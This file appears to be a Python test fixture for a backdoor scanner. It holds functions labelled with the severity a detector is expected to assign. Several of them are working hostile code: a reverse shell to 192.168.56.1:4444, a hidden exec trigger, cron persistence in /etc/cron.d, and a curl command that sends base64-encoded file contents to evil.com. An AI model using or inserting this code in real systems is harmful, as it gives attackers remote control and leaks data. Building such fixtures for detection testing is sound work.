import os
import socket
import subprocess
import threading
import time
import base64

# =========================
# 1️⃣ 明显后门：反弹 Shell（应 CRITICAL）
# =========================
def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.56.1", 4444))  # 可疑外联
    while True:
        cmd = s.recv(1024).decode()
        if cmd == "exit":
            break
        result = subprocess.getoutput(cmd)
        s.send(result.encode())
    s.close()


# =========================
# 2️⃣ 隐蔽后门：条件触发 + exec（应 CRITICAL，但可调节）
# =========================
def magic_trigger(payload):
    if payload.startswith("magic_"):  # 隐蔽触发条件
        code = payload.replace("magic_", "")
        exec(code)


# =========================
# 3️⃣ 持久化后门：写入启动脚本（应 HIGH）
# =========================
def install_persistence():
    cron = "* * * * * python /tmp/.hidden.py\n"
    with open("/etc/cron.d/.sys_update", "w") as f:
        f.write(cron)


# =========================
# 4️⃣ 数据泄露型后门（应 HIGH）
# =========================
def exfiltrate_file(filename):
    with open(filename, "r") as f:
        data = base64.b64encode(f.read().encode())

    os.system("curl -X POST http://evil.com/upload -d data=" + data.decode())


# =========================
# 5️⃣ 可疑但可能正常：远程运维（应被降级）
# =========================
def admin_remote_exec(cmd):
    if os.geteuid() != 0:
        return
    os.system(cmd)   # 有条件保护，应被你降风险


# =========================
# 6️⃣ 正常网络行为（不应当作后门）
# =========================
def normal_api_call():
    import requests
    r = requests.get("https://api.github.com")
    return r.status_code


# =========================
# 7️⃣ 后门线程（长期驻留）
# =========================
def background_listener():
    def worker():
        while True:
            time.sleep(60)
            os.system("whoami")  # 后台执行

    t = threading.Thread(target=worker, daemon=True)
    t.start()


if __name__ == "__main__":
    # 不主动调用，隐藏后门
    pass
